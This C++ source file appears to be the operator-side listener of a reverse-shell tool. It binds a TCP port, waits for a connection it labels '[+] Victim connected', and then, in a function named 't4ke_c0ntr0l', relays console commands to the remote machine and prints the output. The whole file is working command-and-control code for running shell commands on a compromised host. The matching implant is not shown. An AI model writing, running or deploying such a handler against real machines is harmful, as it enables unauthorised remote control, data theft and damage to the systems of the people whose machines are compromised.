#include "server.h"

static int serverSocket = -1;
static int clientSocket = -1;

void signal_handler(int signal){
    if (signal == SIGINT){
        std::cout << "\nSIGINT Received, performin cleanup.." << std::endl;
        cleanup(serverSocket, clientSocket);
        exit(0);
    }
}

Server::Server(int p, const char* ip){
    bzero((char*) &serverAddr_, sizeof(serverAddr_));
    if(p > 0){
        serverPort_ = p;
        serverIpAddr_ = (std::string) ip;
    }
    if (server_init()) {
        t4ke_c0ntr0l();
    }
}

Server::~Server(){
    std::cout << "[+] Initializing cleanup" << std::endl;
    cleanup(serverSocket, clientSocket);
}

bool Server::server_init(){
    serverAddr_.sin_family = AF_INET;
    inet_pton(AF_INET, serverIpAddr_.c_str(), (char*) &serverAddr_.sin_addr);
    serverAddr_.sin_port = htons(serverPort_);

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(serverSocket < 0){
        std::cerr << "[-] Failed to create the socket" << std::endl;
        return false;
    }

    feedback_ = bind(serverSocket, (const struct sockaddr*) &serverAddr_, sizeof(serverAddr_));
    if (feedback_ < 0) {
        std::cerr << "[-] Failed to bind. Error: " << strerror(feedback_) << std::endl;
        return false;
    }
    std::cout << "[+] Socket binded successfully" << std::endl;

    feedback_ = listen(serverSocket, MAX_CLIENT_SIZE);
    if(feedback_ < 0) {
        std::cerr << "[-] Failed to listen. Error: " << std::endl;
        return false;
    }
    std::cout << "[+] Waiting for the peer connect on port " << serverPort_ << "..." << std::endl;
    clientSocket = accept(serverSocket, (struct sockaddr*) &clientAddr_, &clientAddrLen_);
    if(clientSocket < 0) {
        std::cerr << "[-] Failed to accept the connection. Error: " << strerror(feedback_) << std::endl;
        return false;
    }
    std::cout << "[+] Victim connected" << std::endl;
    runProgram_ = true;
    return true;
}

void Server::t4ke_c0ntr0l(){ 
    int bytesReceived=0, bytesSent=0;
    c_recv(clientSocket, combinedShellText_, MAX_SHELL_STR_SIZE, runProgram_, bytesReceived);
    
    while(runProgram_) {
        std::cout << combinedShellText_ << "$ ";
        std::getline(std::cin, command_);

        if(command_ == "exit" || command_ == "quit" || command_ == "q") runProgram_ = false;

        c_send(clientSocket, command_.c_str(), command_.size(), runProgram_, bytesSent);
        c_recv(clientSocket, output_, MAX_OUTPUT_SIZE, runProgram_, bytesReceived);
        if(command_.substr(0,2) == "cd"){
            strcpy(combinedShellText_,output_);
        }
        else{
            std::cout << "\n" << output_ << std::endl;
        }
    }
}

int main(int argc, char* argv[]){
    std::signal(SIGINT, signal_handler);
    
    Server* server = nullptr;
    
    if (argc == 1) {
        server = new Server(USE_DEFAULT_VALUES, "");
    }

    else if (argc == 3) {
        server = new Server(atoi(argv[2]), argv[1]);
    }
    
    delete server;
    return 0;
}